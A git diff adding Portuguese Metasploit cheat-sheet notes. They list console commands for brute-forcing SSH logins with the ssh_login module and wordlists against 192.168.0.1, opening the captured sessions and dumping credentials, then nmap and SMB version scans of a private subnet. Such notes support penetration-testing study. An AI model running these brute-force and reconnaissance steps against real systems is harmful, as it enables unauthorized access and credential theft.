@@ -59,6 +59,74 @@ Listando informações
 
 `vulns`
 
+## Ataques de força bruta
+
+`search type:auxiliary ssh`
+
+`use auxiliary/scanner/ssh/ssh_login`
+
+`show options`
+
+`nano /opt/users.txt`
+
+`nano /opt/pass.txt`
+
+`set RHOST 192.168.0.1`
+
+`set THREADS 10`
+
+`set USER_FILE /opt/users.txt`
+
+`set PASS_FILE /opt/pass.txt`
+
+`set VERBOSE true`
+
+`run`
+
+`sessions` 
+
+`sessions -i 1`
+
+`creds`
+
+## Levantamento de Informações
+
+`db_nmap -p 139,445 --open -Pn -sS 192.168.0/24`
+
+`services`
+
+`services -p 139`
+
+`services -p 445`
+
+`search type:auxiliary smb`
+
+`use auxiliary/scanner/smb/smb_version`
+
+`info`
+
+`service -p 445 --rhosts`
+
+`show options`
+
+`run`
+
+`hosts`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
